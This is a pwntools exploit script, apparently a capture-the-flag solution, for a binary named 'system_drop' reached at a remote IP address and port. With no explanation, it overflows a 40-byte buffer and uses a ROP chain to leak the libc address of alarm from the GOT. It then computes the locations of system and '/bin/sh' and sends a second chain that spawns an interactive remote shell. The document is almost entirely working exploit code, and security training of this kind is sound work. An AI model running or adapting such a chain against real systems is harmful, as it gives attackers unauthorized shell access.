from pwn import *

elf = ELF('./system_drop')
#r = process('./system_drop')
r = remote('138.68.185.219',32689)


# gadgets

syscall_ret = 0x40053b
read = 0x400440
pop_rdi = 0x4005d3
pop_rsi_r15 = 0x4005d1
_start = 0x400450

buf = 'A'*40
buf += p64(read)
buf += p64(pop_rdi)
buf += p64(1) # stdout
buf += p64(pop_rsi_r15)
buf += p64(elf.got['alarm'])
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(_start)


r.send(buf)
r.send('A') # send 1 byte for write syscall

leak = u64(r.recv(8))
log.info('Leaked alarm: %s' % hex(leak))
system = leak - 0x950c0
bin_sh = leak + 0xcf80a
log.info('Libc system @ %s' % hex(system))
log.info('Libc bin_sh @ %s' % hex(bin_sh))
r.recv()

# new buf

buf = 'B'*40
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(pop_rsi_r15)
buf += p64(0)
buf += p64(0)
buf += p64(system)

r.send(buf)

r.interactive()
